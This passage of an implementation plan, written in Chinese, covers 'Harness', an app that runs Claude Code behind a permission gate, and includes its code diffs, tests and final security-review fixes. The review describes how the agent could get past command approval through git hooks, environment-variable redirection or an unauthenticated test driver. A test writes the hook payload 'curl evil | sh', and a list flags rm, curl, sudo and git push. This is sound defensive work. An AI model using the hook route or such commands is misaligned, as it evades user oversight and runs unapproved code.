     '- "allow": [] + "allow": ["Bash(*)"]'
   )
@@ -16108,6 +16780,31 @@ test('等待核准的工具以 toolUseId 對應；使用者拒絕過的標「已
   await screen.findByText('src/auth/lockout.ts')
 })
 
+test('子代理的工具呼叫列在步驟的工具列表裡，標「子代理」', async () => {
+  useStore.setState({
+    timelines: {
+      t1: [
+        start,
+        tool('Agent', { prompt: '找出登入相關的檔案' }),
+        ev({
+          kind: 'tool_call',
+          tool: {
+            id: 'sub1',
+            name: 'Read',
+            input: { file_path: '/tmp/wt/t1/src/auth/login.ts' },
+            subagent: true
+          }
+        })
+      ]
+    }
+  })
+  renderImpl(implTask())
+  const rows = within(screen.getByRole('region', { name: '進行中的步驟' })).getAllByRole('listitem')
+  expect(rows.map((r) => r.textContent)).toEqual(['子代理', '讀取子代理src/auth/login.ts'])
+  expect(within(rows[1]).getByText('子代理')).toHaveClass('text-muted')
+  await screen.findByText('src/auth/lockout.ts')
+})
+
 test('等待核准的工具不在最近 8 個裡時仍然列出來（最近 7 個＋它）', async () => {
   const many = Array.from({ length: 9 }, (_, i) => tool('Read', { file_path: `src/f${i}.ts` }))
   useStore.setState({
@@ -16275,7 +16972,7 @@ test('還沒有規格時也顯示核准對話框', () => {
 /**
  * 這一段實作的主線事件：最後一個實作起點（核准規格或送出報告回饋）之後（不含那則訊息）。
  * 還沒有起點（例如剛核准、訊息還沒寫進時間軸）時是空的，不會顯示釐清階段的對話。
- * 起點看 user_text 的 ref；整份時間軸都沒有標記（加上標記之前的任務）才比對顯示文字。
+ * 起點看 user_text 的 ref；整份時間軸都沒有標記（開發期間、加上標記之前的任務）才比對顯示文字。
  */
 export function implementEvents(events: TimelineEvent[]): TimelineEvent[] {
   const main = events.filter((e) => e.channel === 'main')
@@ -16298,7 +16995,7 @@ export const APPROVAL_ARM_MS = 500
 /** 要寫入的內容先顯示前幾個字，其餘按「顯示完整內容」展開 */
 export const PREVIEW_COLLAPSED = 1500
 
-/** 修改這些工具的請求只會出現在 .git／.claude／.mcp.json（主程序只對這些路徑詢問） */
+/** 修改這些工具的請求只會出現在受保護的路徑（.git、.claude、.mcp.json、git hooks；主程序只對這些路徑詢問） */
 const WRITE_TOOLS = new Set(['Edit', 'Write', 'MultiEdit', 'NotebookEdit'])
 
 const str = (v: unknown) => (typeof v === 'string' ? v : undefined)
@@ -16360,7 +17057,7 @@ export function describeRequest(r: PermissionRequest, cwd: string, branch?: stri
       title: `${who}想修改這個檔案`,
       code: relativeTo(cwd, path),
       sub: `${r.toolName} · cwd: ${cwd}`,
-      warning: '這個檔案會影響 Claude 的權限或 git 設定',
+      warning: '這個檔案會影響 Claude 的權限、git 設定，或在 git 操作時執行的 hook',
       preview: writePreview(i)
     }
   }
@@ -16394,6 +17091,7 @@ export function describeRequest(r: PermissionRequest, cwd: string, branch?: stri
 import { type KeyboardEvent, useEffect, useEffectEvent, useId, useRef, useState } from 'react'
 import type { PermissionRequest, Task } from '@shared/types'
 import { call } from '../api'
+import { checkNewPattern } from '../lib/allowedCommands'
 import { isComposing } from '../lib/ime'
 import { APPROVAL_ARM_MS, describeRequest, PREVIEW_COLLAPSED, requesterOf } from '../lib/permission'
 import { usePending } from '../lib/usePending'
@@ -16429,6 +17127,11 @@ export function PermissionDialog({
   const [pending, run] = usePending()
   const v = describeRequest(r, cwd, branch)
   const locked = pending || !armed
+  // 記住的樣式範圍很廣或有危險時，和設定頁新增指令一樣提醒
+  const patternWarning = r.suggestedPattern
+    ? checkNewPattern(r.suggestedPattern, []).warning
+    : undefined
+  const patternWarningId = useId()
 
   useEffect(() => {
     const t = setTimeout(() => setArmed(true), APPROVAL_ARM_MS)
@@ -16534,18 +17237,29 @@ export function PermissionDialog({
         )}
         {v.reason && <span className="text-[13px] text-ink-2">{v.reason}</span>}
         {r.suggestedPattern ? (
-          <label className="flex cursor-pointer items-center gap-2.5 text-[13px]">
-            <input
-              type="checkbox"
-              checked={remember}
-              disabled={pending}
-              onChange={(e) => setRemember(e.target.checked)}
-              className="size-4 flex-none accent-brand"
-            />
-            <span>
-              本任務內都允許 <code>{r.suggestedPattern}</code>
-            </span>
-          </label>
+          <div className="flex flex-col gap-1.5">
+            <label className="flex cursor-pointer items-center gap-2.5 text-[13px]">
+              <input
+                type="checkbox"
+                checked={remember}
+                disabled={pending}
+                onChange={(e) => setRemember(e.target.checked)}
+                aria-describedby={patternWarning ? patternWarningId : undefined}
+                className="size-4 flex-none accent-brand"
+              />
+              <span>
+                本任務內都允許 <code>{r.suggestedPattern}</code>
+              </span>
+            </label>
+            {patternWarning && (
+              <span
+                id={patternWarningId}
+                className="ml-[26px] rounded-[10px] bg-decision px-3 py-2 text-xs text-decision-ink"
+              >
+                {patternWarning}
+              </span>
+            )}
+          </div>
         ) : (
           r.toolName === 'Bash' && (
             <span className="text-xs text-muted">這個指令含有串接、重導或變數，只能逐次核准。</span>
@@ -16626,7 +17340,7 @@ import { type ReactNode, useEffect, useMemo, useRef, useState } from 'react'
 import { msgDisplay } from '@shared/protocol'
 import type { DiffStats, PlanStep, Task, TimelineEvent } from '@shared/types'
 import { call } from '../api'
-import { Composer } from '../components/Composer'
+import { Composer, StopButton } from '../components/Composer'
 import { InlineCode, Markdown } from '../components/Markdown'
 import { PendingPermission } from '../components/PermissionDialog'
 import { AnsweredQuestionRow, QuestionCard } from '../components/QuestionCard'
@@ -16636,6 +17350,7 @@ import { isBusy } from '../lib/stage'
 import {
   implementEvents,
   latestQuestionEvents,
+  SUBAGENT_LABEL,
   type ToolCall,
   toolLabel,
   toolSummary,
@@ -16690,6 +17405,11 @@ function ToolRows({
             >
               {toolLabel(e.tool.name)}
             </span>
+            {e.tool.subagent && (
+              <span className="flex-none rounded-full bg-surface px-1.5 text-[11px] text-muted">
+                {SUBAGENT_LABEL}
+              </span>
+            )}
             <code className="min-w-0 truncate" title={target}>
               {target}
             </code>
@@ -16859,7 +17579,6 @@ export function ImplementScreen({
     onScroll,
     stick
   } = useStickToBottom<HTMLDivElement>(`${events.length}:${task.updatedAt}`, task.id, events.length)
-  const [stopping, runStop] = usePending()
   const [showing, runShow] = usePending()
   const [, runResume] = usePending()
   const composerRef = useRef<HTMLInputElement>(null)
@@ -16870,7 +17589,7 @@ export function ImplementScreen({
   const done = task.plan.filter((s) => s.status === 'done').length
   const runningIdx = task.plan.findIndex((s) => s.status === 'running')
 
-  // 等待核准的請求以 toolUseId 對應時間軸上的工具呼叫；舊資料沒有 id 時找最近一個相同的呼叫
+  // 等待核准的請求以 toolUseId 對應時間軸上的工具呼叫；沒有 id 的（開發期間的舊資料）找最近一個相同的呼叫
   const p = task.pendingPermission
   const allTools = events.filter(isToolCall)
   const waitingTool = p?.toolUseId ? allTools.findLast((e) => e.tool.id === p.toolUseId) : undefined
@@ -17046,21 +17765,7 @@ export function ImplementScreen({
                     stick()
                     void act(() => call('tasks:send', task.id, 'main', t))
                   }}
-                  extra={
-                    running && (
-                      <button
-                        type="button"
-                        disabled={stopping}
-                        onClick={() =>
-                          void runStop(() => act(() => call('run:stop', task.id, 'main')))
-                        }
-                        className="flex h-10 flex-none cursor-pointer items-center gap-1.5 rounded-full bg-surface px-4 text-[13px] text-danger disabled:cursor-default disabled:opacity-50"
-                      >
-                        <Icons.Stop width={12} height={12} />
-                        停止
-                      </button>
-                    )
-                  }
+                  extra={running && <StopButton taskId={task.id} channel="main" />}
                 />
               </div>
             </div>
@@ -17118,7 +17823,7 @@ import { flushSync } from 'react-dom'
 import type { Task } from '@shared/types'
 import { call } from '../api'
 import { BranchPanel } from '../components/BranchPanel'
-import { Composer } from '../components/Composer'
+import { Composer, StopButton } from '../components/Composer'
 import { PendingPermission } from '../components/PermissionDialog'
 import { RunStatus, Timeline } from '../components/Timeline'
 import { branchSeed, branchTitle } from '../lib/branchDraft'
@@ -17245,6 +17950,12 @@ export function ClarifyScreen({
                     stick()
                     void act(() => call('tasks:send', task.id, 'main', t))
                   }}
+                  // 主線執行中（含等待核准）可以停止；整理報告不會在釐清時發生
+                  extra={
+                    (task.runState === 'running' || task.runState === 'waiting_permission') && (
+                      <StopButton taskId={task.id} channel="main" />
+                    )
+                  }
                 />
               </div>
             </div>
@@ -20875,6 +21586,26 @@ describe('SettingsScreen：Claude 帳號', () => {
     expect(error).toHaveClass('text-danger')
   })
 
+  test('啟動時環境裡有 API key 等變數：說明已忽略，一律使用訂閱登入', () => {
+    const { rerender } = render(<SettingsScreen />)
+    expect(screen.queryByText(/已忽略環境變數/)).not.toBeInTheDocument()
+    act(() =>
+      useStore.setState({
+        claude: {
+          ...useStore.getState().claude!,
+          ignoredEnv: ['ANTHROPIC_API_KEY', 'ANTHROPIC_BASE_URL']
+        }
+      })
+    )
+    rerender(<SettingsScreen />)
+    const account = region('Claude 帳號')
+    expect(
+      within(account).getByText(
+        '已忽略環境變數 ANTHROPIC_API_KEY、ANTHROPIC_BASE_URL，Harness 一律使用 Claude Code 的訂閱登入'
+      )
+    ).toBeInTheDocument()
+  })
+
   test('重新檢查進行中：按鈕保留焦點、標示停用並忽略再次點擊', async () => {
     const gate = deferred()
     replies['claude:status'] = async () => {
@@ -20998,6 +21729,8 @@ describe('SettingsScreen：權限', () => {
     expect(within(perm).getByText('worktree 內的檔案讀寫自動允許')).toBeInTheDocument()
     expect(within(perm).getByText('shell 指令需要核准')).toBeInTheDocument()
     expect(within(perm).getByText('.mcp.json')).toBeInTheDocument()
+    expect(within(perm).getByText(/與 git hooks 需要核准/)).toBeInTheDocument()
+    expect(within(perm).getByText(/Harness 自動 commit 時不執行 git hook/)).toBeInTheDocument()
     // 清單下方說明樣式規則與串接指令
     expect(within(perm).getByText(/一律需要核准/)).toBeInTheDocument()
   })
@@ -21425,8 +22158,17 @@ export function matchesPattern(command: string, pattern: string): boolean {
   return c === p
 }
 
+/**
+ * 這些指令換個參數就可能刪檔、把結果寫到 worktree 以外（git diff／log 的 --output）、連網或推送：
+ * 核准時只建議記住完全相同的指令（設定頁對這些樣式也會提醒，見 renderer 的 allowedCommands.ts）
+ */
+const EXACT_ONLY = [['rm'], ['curl'], ['sudo'], ['git', 'diff'], ['git', 'log'], ['git', 'push']]
+
+/** 核准對話框「本任務內都允許」建議的樣式：前兩個詞加 *；危險的指令是完全相同的指令 */
 export function suggestPattern(command: string): string {
-  const parts = normalize(command).split(' ')
+  const c = normalize(command)
+  const parts = c.split(' ')
+  if (EXACT_ONLY.some((words) => words.every((w, i) => parts[i] === w))) return c
   return `${parts.slice(0, Math.min(2, parts.length)).join(' ')} *`
 }
 ```
@@ -21783,6 +22525,11 @@ function AccountSection({
           </>
         )}
       </dl>
+      {!!claude?.ignoredEnv?.length && (
+        <p className="m-0 rounded-[10px] bg-decision px-3 py-2 text-xs text-decision-ink">
+          已忽略環境變數 {claude.ignoredEnv.join('、')}，Harness 一律使用 Claude Code 的訂閱登入
+        </p>
+      )}
       <span className="text-xs text-muted">
         尚未登入時，會請你在終端機執行 <code>claude</code> 完成登入。
       </span>
@@ -21994,10 +22741,11 @@ function PermissionSection({ settings, save }: { settings: Settings; save: Save 
         <FixedRule
           title={
             <>
-              修改 <code>.git</code>、<code>.claude</code> 與 <code>.mcp.json</code> 需要核准
+              修改 <code>.git</code>、<code>.claude</code>、<code>.mcp.json</code> 與 git hooks
+              需要核准
             </>
           }
-          detail="這些檔案會改變 git 或 Claude 的行為，即使在 worktree 內也會先詢問"
+          detail="這些檔案會改變 git 或 Claude 的行為，即使在 worktree 內也會先詢問。git hooks 包含 .husky、.githooks、lefthook、pre-commit 與 core.hooksPath；Harness 自動 commit 時不執行 git hook"
         />
         <FixedRule title="shell 指令需要核准" detail="下方清單中的指令不必詢問" />
         <AllowedCommands list={settings.alwaysAllowedCommands} save={save} />
@@ -23819,7 +24567,7 @@ export function branchSeed(excerpt: string, question: string): string {
   return `${SEED_HEAD}${take(excerpt.trim(), EXCERPT_MAX)}${SEED_QUESTION}${question.trim()}`
 }
 
-/** 分岔面板顯示開場訊息時拆回引用與問題；不是這個格式（例如舊的分岔）回傳 undefined */
+/** 分岔面板顯示開場訊息時拆回引用與問題；不是這個格式（例如開發期間建立的舊分岔）回傳 undefined */
 export function parseBranchSeed(text: string): { excerpt: string; question: string } | undefined {
   if (!text.startsWith(SEED_HEAD)) return undefined
   // 問題來自單行輸入框，不會含有分隔用的換行：取最後一個分隔
@@ -24223,6 +24971,670 @@ Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
 # fix(main): keep Harness message tags out of Claude's replies
 git add docs
 git commit -m "docs: record the second end-to-end verification and its fixes (Task 38)
+
+Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
+```
+
+---
+
+### Task 39：總審查修正
+
+交付前對整個分支做最後一次審查，找到下面這些問題。全部依 TDD（先寫會失敗的測試）修正，每一項一個 commit（C1 與 M3 都改 `gitService.ts`，合在同一個 commit；I2 的 README 與 M8 各自一個 docs commit）。
+
+必須修正：
+- **C1 git hook 繞過指令核准**：提交報告時 app 自己的 commit 會執行 repo 的 git hooks，而 hook 是 worktree 裡 Claude 改得到的檔案（`.husky/`、`.githooks/`、lefthook 的 `lefthook*.yml`／`.lefthook*`、pre-commit 的 `.pre-commit-config.yaml`、設定的 `core.hooksPath`）：Claude 可以不經核准就讓 app 跑任意程式。
+- **I1 環境變數**：環境裡的 `ANTHROPIC_API_KEY`、`ANTHROPIC_AUTH_TOKEN`、`ANTHROPIC_BASE_URL`、`CLAUDE_CODE_USE_BEDROCK`、`CLAUDE_CODE_USE_VERTEX`、`CLAUDE_CODE_USE_FOUNDRY` 會原樣傳給 Claude Code，讓它改用 API key、其他供應商或代理端點，違反「只用訂閱登入」。
+- **I2 沒有 README**。
+- **I3 E2E 驅動程式沒有驗證**：`scripts/e2e/driver.mjs` 在 127.0.0.1 執行任何送來的 JS，本機的其他程式或網頁都能操作 app 與這台電腦。
+- **I4 報告整理中斷或失敗後的續接不確定**：「繼續」送 `[resume]`，要靠 Claude 再提交一次報告。
+
+應該修正：
+- **M1** `WebFetch`／`WebSearch` 在釐清、規格、分岔階段要核准是刻意的，但設計文件 §3.4 寫成「其他一律 deny」，也沒有測試固定這個行為。
+- **M2** 核准對話框的「本任務內都允許」一律建議前兩個詞加 ` *`（`rm -rf *`、`git push *`…），也不像設定頁那樣提醒範圍很廣或有危險的樣式。
+- **M3** git／gh 指令沒有逾時：push 卡在 ssh、commit 卡住時整理報告或開 PR 會一直等。
+- **M4** 只有實作畫面能停止 Claude；釐清的主線與分岔執行中沒有停止按鈕。
+- **M5** 子代理（`Agent`／`Task` 工具）的訊息整個被丟掉，Claude 用 Explore 子代理讀檔時時間軸只看到「子代理 1 次」。
+- **M6** 設計文件與程式不符：§5 的額度用盡寫「暫停」、SDK 崩潰寫「已中斷」；§3.1 沒說清除 worktree 也會刪本機分支。另外以失敗的 `result` 結束的主線（例如額度用盡）只記錯誤、回到 idle，畫面沒有「繼續」。
+- **M7** 沒用到的 `Panel`（ui.tsx）、`resources/icon.png`，`package.json` 還留著範本的 `author`、`homepage`；給舊資料的相容程式碼沒有說明為什麼存在。
+- **M8** 計畫的「慣例」寫著個人電腦上的絕對路徑。
+
+**Files:**
+- Create: `README.md`
+- Delete: `resources/icon.png`
+- Modify（各 Task 的程式碼區塊已更新為最終版本）：
+  - Task 10：`src/main/store/repository.ts`（開發期間資料相容的註解）
+  - Task 12：`tests/main/commandPattern.test.ts`；Task 34：`src/main/permissions/commandPattern.ts`（`EXACT_ONLY`）
+  - Task 13：`src/main/permissions/gate.ts`（`HOOK_DIRS`、`HOOK_CONFIG`、`hooksDirInside`、`GateContext.hooksDir`）、`tests/main/gate.test.ts`
+  - Task 14：`src/main/git/gitService.ts`（`commitAll` 不執行 hook、`hooksPath`、`runCommand` 的 `timeoutMs`、`GitTimeouts`）、`tests/main/gitService.test.ts`
+  - Task 16：`src/main/claude/detect.ts`（`IGNORED_CLAUDE_ENV`、`claudeEnv`、`ignoredClaudeEnv`、`ExecOptions.env`、`detectClaude` 的 `env` 參數）、`tests/main/detect.test.ts`
+  - Task 20：`src/main/agent/agentRun.ts`（子代理的 `tool_use` → `tool_call` ＋ `subagent: true`）、`tests/main/agentRun.test.ts`
+  - Task 21：`src/main/tasks/taskManager.ts`（import；`startTurn` 讀 `hooksPath`、`env` 用 `claudeEnv()`、主線開新一輪時清掉 `pendingReport`；`tool_call` 保留 `subagent`；失敗的最後一個主線 `turn_end` 標為 `error`；`submitReport` 改呼叫 `startFinalizing`）、`tests/main/fakeClaude.ts`（`hooksPath`）
+  - Task 23：`resume()`（有 `pendingReport` 時直接重新整理）；Task 24：`startFinalizing`、`finalizeReport`（沿用 `pendingReport.commit`、成功時清掉）
+  - Task 5：`src/shared/protocol.ts`（`legacyImplementStart` 的註解）
+  - Task 26：`src/renderer/src/components/ui.tsx`（移除 `Panel`）
+  - Task 29：`src/renderer/src/components/Timeline.tsx`（`ToolGroup` 的子代理計數與標籤；`RunStatus` 的重新整理說明）、`src/renderer/src/lib/timeline.ts`（`SUBAGENT_LABEL`、註解）、`tests/renderer/Timeline.test.tsx`
+  - Task 30：`src/renderer/src/components/BranchPanel.tsx`（分岔的停止按鈕）、`tests/renderer/BranchPanel.test.tsx`、`src/renderer/src/lib/branchDraft.ts`（註解）
+  - Task 32：`src/renderer/src/screens/ClarifyScreen.tsx`（停止按鈕）、`src/renderer/src/screens/ImplementScreen.tsx`（`StopButton`、子代理標籤、註解）、`src/renderer/src/components/PermissionDialog.tsx`（樣式提醒）、`src/renderer/src/lib/permission.ts`（受保護檔案的說明）、`tests/renderer/PermissionDialog.test.tsx`、`tests/renderer/ImplementScreen.test.tsx`
+  - Task 34：`src/renderer/src/screens/SettingsScreen.tsx`（忽略的環境變數、git hooks 的固定規則）、`tests/renderer/SettingsScreen.test.tsx`
+- Modify（程式碼在本 Task 的區塊）：`src/shared/types.ts`、`src/renderer/src/components/Composer.tsx`、`scripts/e2e/driver.mjs`、`scripts/e2e/run.mjs`、`tests/main/taskManager.test.ts`、`tests/renderer/ClarifyScreen.test.tsx`、`package.json`（移除 `author`、`homepage`）
+- Modify: `docs/plans/2026-10-07-harness-design.md`（§3.1、§3.2、§3.4、§3.6、§3.7、§3.8、§4、§5）、`docs/verification.md`（重跑方式與驅動程式的權杖）、本計畫的「慣例」與 Task 35（驅動程式的用法）
+
+**行為重點：**
+- **C1**：`GitService.commitAll` 用 `git -c core.hooksPath=/dev/null commit --no-verify`：`--no-verify` 只跳過 pre-commit 與 commit-msg，`core.hooksPath=/dev/null` 讓 post-commit 等其他 hook 也不執行（取代原本「刻意不加 --no-verify」的註解）。PermissionGate 把下列寫入列為受保護（`ask`）：任何一層的 `.husky`、`.githooks`、`.lefthook`、`.lefthook-local` 資料夾；檔名符合 `/^(\.?lefthook(-local)?\.(ya?ml|json|jsonc|toml)|\.pre-commit-config\.ya?ml)$/`；以及 repo 設定的 `core.hooksPath` 在 worktree 內時的那個資料夾（`hooksPath` 是 worktree 根目錄時是根目錄的檔案；比對不分大小寫）。`core.hooksPath` 由 `GitService.hooksPath(wt)`（`git config --type=path --get core.hooksPath`，相對路徑以 worktree 為準）在每一輪開始時讀一次，`hooksDirInside(worktree, hooksPath)` 換算成相對路徑放進 `GateContext.hooksDir`，`evaluateTool` 本身不碰 git；讀不到就照常開始這一輪。ask 的訊息是「修改 git 設定、git hooks、Claude 或 MCP 設定檔需要使用者核准」，對話框的說明改成「這個檔案會影響 Claude 的權限、git 設定，或在 git 操作時執行的 hook」，設定頁的固定規則加上 git hooks。合併與 push 照常執行 hook（使用者看過報告與 diff 才按），寫在設計 §3.7 與 README。設計 §3.4 與 README 記下固有的限制：核准 `npm test *` 這類專案腳本的樣式後，Claude 可以改 `package.json` 改變它實際跑什麼，VerifyRunner 也會重跑它。
+- **I1**：`claudeEnv(env)` 回傳去掉 `IGNORED_CLAUDE_ENV` 的複本，`TaskManager` 的 `env` 與 `detectClaude` 執行 `claude --version`／`claude auth status` 都用它（`CLAUDE_CODE_OAUTH_TOKEN` 等其他變數照傳）。`detectClaude(exec, path?, env = process.env)` 回傳 `ignoredEnv`（有設定且非空的那些）；設定頁的 Claude 帳號區塊在有值時顯示「已忽略環境變數 X、Y，Harness 一律使用 Claude Code 的訂閱登入」。
+- **I3**：驅動程式啟動時產生 32 bytes 的隨機權杖，先刪掉舊檔再以 0600 寫到 `<dir>/token`，結束時刪除。只接受 POST、路徑 `/run` 或 `/quit`、沒有 `Origin`、`Host` 是 `127.0.0.1:<port>`、`x-harness-e2e-token` 相符（`timingSafeEqual`）的請求，否則回 405／404／403／403／401 與原因。`run.mjs` 用 `--dir`（或 `E2E_DIR`）找到權杖。
+- **I4**：`startFinalizing(taskId, pending, run?)` 在同一個 `update` 裡設定 `runState = 'finalizing'`、清掉 `error`、存 `task.pendingReport = { input }`，再在背景跑 `finalizeReport`（`submit_report` 與重試共用）。`finalizeReport` commit 後把 sha 記到 `pendingReport.commit`（`commitAll` 回傳 null 時沿用它），成功進入 `reviewing` 的同一步清掉 `pendingReport`；失敗或中斷時留著（`runState` 是 `error`／`interrupted`）。`resume()` 在 `pendingReport` 存在、任務在實作中且主線沒有執行時直接呼叫 `startFinalizing`（不送 `[resume]`、不呼叫 Claude）。主線開新一輪（使用者改為繼續和 Claude 對話）時清掉 `pendingReport`。`RunStatus` 有 `pendingReport` 時：中斷顯示「報告還沒整理完就中斷了。」，兩種情況都接著說明「按「繼續」會直接重新整理報告，不會再呼叫 Claude。」
+- **M1**：行為不變，測試固定：`WebFetch`／`WebSearch` 在 clarify、branch、implement 都是 `ask`（`evaluateTool`、hook、`canUseTool` 都一樣，核准後不記住樣式），closed 是 deny。
+- **M2**：`suggestPattern` 對 `rm`、`curl`、`sudo`、`git diff`、`git log`、`git push` 開頭的指令回傳正規化後的完整指令（不加 ` *`）。核准對話框用 `checkNewPattern(r.suggestedPattern, [])` 的 `warning`，顯示在勾選框下（`aria-describedby`），例如「「ls *」會允許所有 ls 開頭的指令，範圍很廣」。
+- **M3**：`runCommand` 的 `timeoutMs`（預設 60 秒）：以 `detached` 自成 process group，逾時送 SIGTERM 給整個群組、1 秒後 SIGKILL，立刻以「執行逾時（超過 N 秒），已終止」拒絕（不等子程序關閉輸出）。`new GitService({ timeouts })` 可設定，預設 `{ default: 60_000, commit: 120_000, network: 300_000 }`：commit、合併、建立 worktree 用 `commit`，push 與 `gh pr create` 用 `network`。整理報告時逾時就是整理失敗（可依 I4 重試）。
+- **M4**：`StopButton`（`Composer.tsx`）：`run:stop` 經 `usePending`，進行中停用、連點只送一次。實作畫面改用它；釐清畫面在主線 `running`／`waiting_permission` 時放在輸入列；分岔執行中放在分岔輸入框旁（`channel` 是 `branch:<id>`，只停那個分岔）。唯讀時都不顯示。
+- **M5**：`mapMessage` 對帶 `parent_tool_use_id` 的 assistant 訊息只回傳 `tool_use` 對應的 `tool_call`（`subagent: true`），子代理的文字、錯誤與工具結果仍然略過；`TaskManager` 把 `subagent` 寫進時間軸事件的 `tool`。釐清的工具摘要把子代理的呼叫分開計數（「子代理讀取 2 次」），展開後每一行前面有「子代理」標籤；實作的工具列表在工具名稱後面加「子代理」標籤。
+- **M6**：主線最後一個 `turn_end` 失敗（不是使用者停止）時，除了 `task.error` 也把 `runState` 設為 `error`（`running`／`waiting_permission` 才改，整理報告中不動），與程序崩潰一致，畫面提供「繼續」。設計 §5 改寫額度用盡、崩潰與關閉 app 的行為；§3.1 說明清除 worktree 會一併刪除本機分支（介面的確認文字本來就這樣寫）。
+- **M7**：移除 `Panel`、`resources/icon.png`、`package.json` 的 `author` 與 `homepage`（不加任何個人資訊）。舊資料的相容程式（`legacyImplementStart`、報告補 `tests: []`、沒有 `toolUseId` 的核准請求、舊格式的分岔開場）保留，註解註明是開發期間資料的相容。
+- **M8**：「慣例」改成「所有指令在 repo 根目錄執行」；文件與 README 不放個人路徑或 email（測試資料裡的 `/Users/me`、`example.com` 是假的）。
+
+**Step 1: 寫失敗測試**
+
+既有的測試檔加上（程式碼在上面列出的各 Task 區塊裡）：
+- `tests/main/gitService.test.ts`：「commitAll 不執行任何 git hook」（`core.hooksPath` 指向 worktree 裡的 `.husky`，pre-commit 失敗、post-commit 寫標記：commit 成功、沒有標記；一般的 `git commit` 會執行 hook）、「hooksPath：…沒設定時 undefined」、`runCommand`「逾時就終止整個程序群組並回報錯誤」（子程序也被終止）、「push 卡住時依設定的上限終止並回報錯誤」（`core.sshCommand` 是 `sleep`）、「預設上限」。
+- `tests/main/gate.test.ts`：「寫入 git hook 的設定與腳本需要使用者核准」（含名稱相近的一般檔案照常允許）、「repo 設定的 core.hooksPath 在 worktree 內時…」、「hooksDirInside」、「WebFetch／WebSearch 在釐清、規格、分岔與實作階段都要使用者核准」。
+- `tests/main/detect.test.ts`：「API key、其他驗證方式與端點的環境變數不傳給 claude，並回報忽略了哪些」、「claudeEnv 是複本」；「找到且已登入」改傳 `env` 並期待 `ignoredEnv: []`。
+- `tests/main/commandPattern.test.ts`：「危險的指令只建議完全相同的指令」（`git diff` 原本期待 `git diff *`）。
+- `tests/main/agentRun.test.ts`：「子代理的工具呼叫標成 subagent；子代理的文字與工具結果略過」（取代「子代理的訊息略過」）。
+- `tests/renderer/PermissionDialog.test.tsx`：「「本任務內都允許」的樣式範圍很廣或有危險時，顯示和設定頁一樣的提醒」；受保護檔案的說明文字。
+- `tests/renderer/SettingsScreen.test.tsx`：「啟動時環境裡有 API key 等變數：說明已忽略…」；固定規則含 git hooks。
+- `tests/renderer/Timeline.test.tsx`：「子代理的工具呼叫：摘要與明細都標「子代理」」、`RunStatus`「報告已提交、整理中斷或失敗：說明「繼續」會直接重新整理…」。
+- `tests/renderer/ImplementScreen.test.tsx`：「子代理的工具呼叫列在步驟的工具列表裡，標「子代理」」。
+- `tests/renderer/BranchPanel.test.tsx`：「分岔執行中可以停止（只停這個分岔）；連點只送一次」。
+
+`tests/main/taskManager.test.ts`（Task 21 的區塊是當時的版本）：檔頭的 vitest import 加上 `onTestFinished`；「整理報告期間拒絕主線訊息；成功後清除舊錯誤」第一段的 `runState` 改為期待 `'error'`；新增與改寫的測試：
+
+```ts
+  test('不把 API key 與其他驗證方式、端點的環境變數傳給 Claude Code（一律用訂閱登入）', async () => {
+    vi.stubEnv('ANTHROPIC_API_KEY', 'sk-ant-x')
+    vi.stubEnv('ANTHROPIC_BASE_URL', 'https://proxy.example')
+    vi.stubEnv('CLAUDE_CODE_USE_BEDROCK', '1')
+    onTestFinished(() => {
+      vi.unstubAllEnvs()
+    })
+    const { claude, create } = await setup()
+    await create()
+    const env = claude.calls[0].options.env!
+    for (const k of [
+      'ANTHROPIC_API_KEY',
+      'ANTHROPIC_AUTH_TOKEN',
+      'ANTHROPIC_BASE_URL',
+      'CLAUDE_CODE_USE_BEDROCK',
+      'CLAUDE_CODE_USE_VERTEX',
+      'CLAUDE_CODE_USE_FOUNDRY'
+    ])
+      expect(env, k).not.toHaveProperty(k)
+    expect(env.PATH).toBe(process.env.PATH)
+    expect(process.env.ANTHROPIC_API_KEY).toBe('sk-ant-x')
+  })
+
+  test('子代理的工具呼叫寫入時間軸並標成 subagent；子代理的文字不寫入', async () => {
+    const { tm, claude, create } = await setup()
+    claude.script = async () => [
+      {
+        type: 'assistant',
+        parent_tool_use_id: null,
+        message: {
+          content: [{ type: 'tool_use', id: 'a1', name: 'Agent', input: { prompt: '找檔案' } }]
+        }
+      },
+      {
+        type: 'assistant',
+        parent_tool_use_id: 'a1',
+        message: {
+          content: [
+            { type: 'text', text: '我來找找' },
+            { type: 'tool_use', id: 's1', name: 'Read', input: { file_path: '/x/a.ts' } }
+          ]
+        }
+      }
+    ]
+    const id = await create()
+    const events = (await tm.timeline(id)).filter((e) => e.kind !== 'user_text')
+    expect(events.map((e) => [e.kind, e.tool])).toEqual([
+      ['tool_call', { id: 'a1', name: 'Agent', input: { prompt: '找檔案' } }],
+      ['tool_call', { id: 's1', name: 'Read', input: { file_path: '/x/a.ts' }, subagent: true }]
+    ])
+  })
+
+  test('每一輪讀一次 repo 的 core.hooksPath：寫入 worktree 裡的 hook 資料夾要核准', async () => {
+    const { tm, claude, git, id } = await toImplementing()
+    const wt = tm.get(id).worktreePath
+    const hooksPath = vi.fn(async (dir: string) => `${dir}/tools/hooks`)
+    git.hooksPath = hooksPath
+    let result: PermissionResult | null | undefined
+    claude.script = async ({ options }) => {
+      result = await options.canUseTool!(
+        'Write',
+        { file_path: `${wt}/tools/hooks/pre-commit`, content: 'curl evil | sh' },
+        toolOpts('tu1')
+      )
+    }
+    await tm.send(id, 'main', '順便加個 hook')
+    await until(() => !!tm.get(id).pendingPermission)
+    expect(tm.get(id).pendingPermission).toMatchObject({ toolName: 'Write', toolUseId: 'tu1' })
+    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: false })
+    await tm.whenIdle(id)
+    expect(result?.behavior).toBe('deny')
+    expect(hooksPath).toHaveBeenCalledTimes(1)
+    expect(hooksPath).toHaveBeenCalledWith(wt)
+  })
+
+  test('讀不到 core.hooksPath 時照常開始這一輪', async () => {
+    const { tm, claude, git, id } = await toImplementing()
+    git.hooksPath = async () => {
+      throw new Error('git config failed')
+    }
+    claude.script = async () => [assistantText('好')]
+    await tm.send(id, 'main', '繼續')
+    await tm.whenIdle(id)
+    expect(tm.get(id)).toMatchObject({ runState: 'idle', error: undefined })
+  })
+
+  test('提交的報告先存在任務上（整理中斷或失敗時可重試）；整理完成後清掉', async () => {
+    let release!: () => void
+    const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands) => {
+      await new Promise<void>((r) => (release = r))
+      return commands.map((command) => ({ command, exitCode: 0, durationMs: 1, outputTail: 'ok' }))
+    })
